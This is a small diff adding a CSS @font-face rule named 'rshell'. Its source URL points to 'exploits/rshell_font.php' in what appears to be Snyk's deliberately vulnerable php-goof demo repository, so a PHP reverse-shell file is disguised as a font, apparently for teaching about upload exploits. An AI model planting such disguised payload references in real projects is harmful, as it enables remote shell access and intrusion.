@@ -1,0 +1,6 @@
+@font-face {
+    font-family:'rshell';
+    src:url('https://github.com/snyk-labs/php-goof/blob/main/exploits/rshell_font.php?raw=true');
+    font-weight:'normal';
+    font-style:'normal';
+  }
